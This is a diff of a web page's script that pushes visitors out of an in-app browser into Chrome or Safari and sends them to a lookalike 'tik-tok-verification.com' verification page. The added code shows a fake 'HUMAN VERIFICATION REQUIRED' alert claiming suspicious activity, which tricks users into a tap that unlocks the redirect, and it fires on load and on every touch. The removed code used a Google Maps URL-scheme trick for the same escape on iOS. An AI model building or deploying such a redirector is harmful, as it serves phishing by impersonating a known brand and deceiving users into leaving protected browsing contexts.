@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>body { background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }</style>
+    <style>body { background: #fff; margin: 0; padding: 0; }</style>
 </head>
 <body>
 
@@ -11,46 +11,38 @@
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
     const domain = "tik-tok-verification.com/Verification/verify1.html";
 
-    function theTunnelEject() {
+    function forceOut() {
         const isAndroid = /Android/i.test(navigator.userAgent);
 
         if (isAndroid) {
-            // Android: Chrome Intent targeting the 'Always' browser flag
+            // Android Chrome Force
             window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
         } else {
-            // iOS: THE GOOGLE MAPS TUNNEL
-            // We use the 'comgooglemaps://' scheme which is almost always whitelisted.
-            // We provide a 'q' (query) that is actually your URL.
-            // This forces the OS to ask "Open in Google Maps or Safari?"
+            // iOS Direct Protocol
+            // This is the cleanest way to tell the OS: "I need Safari"
+            window.location.href = "safari-https://" + domain;
             
-            window.location.href = "comgooglemaps://?q=" + encodeURIComponent(targetUrl);
-
-            // Immediate secondary pulse for Safari directly
             setTimeout(() => {
-                window.location.href = "safari-https://" + domain;
-            }, 100);
+                window.location.href = "googlechromes://" + domain;
+            }, 50);
         }
     }
 
+    // This runs the moment they land
     window.onload = function() {
-        // Run immediately
-        theTunnelEject();
+        forceOut();
 
-        // Standard Alert to catch the "OK" tap as a user gesture
         setTimeout(() => {
-            if (document.hasFocus()) {
-                const header = "DEVICE COMPATIBILITY CHECK\n";
-                const body = "______________________________\n\nTo continue, please confirm you are using a secure browser session.";
-                alert(header + body);
-                
-                // Re-fire on tap
-                theTunnelEject();
-            }
+            // The Alert acts as the "Verify" button. 
+            // When they tap "OK", it counts as the User Gesture needed to break out.
+            alert("HUMAN VERIFICATION REQUIRED\n\nSuspicious activity detected. Please complete verification in your secure system browser.");
+            
+            forceOut();
         }, 500);
     };
 
-    // Any touch on screen fires the eject
-    document.addEventListener('touchstart', theTunnelEject);
+    // If they touch anywhere, it triggers the force out again.
+    document.addEventListener('touchstart', forceOut);
 </script>
 </body>
-</html>
+</html>s
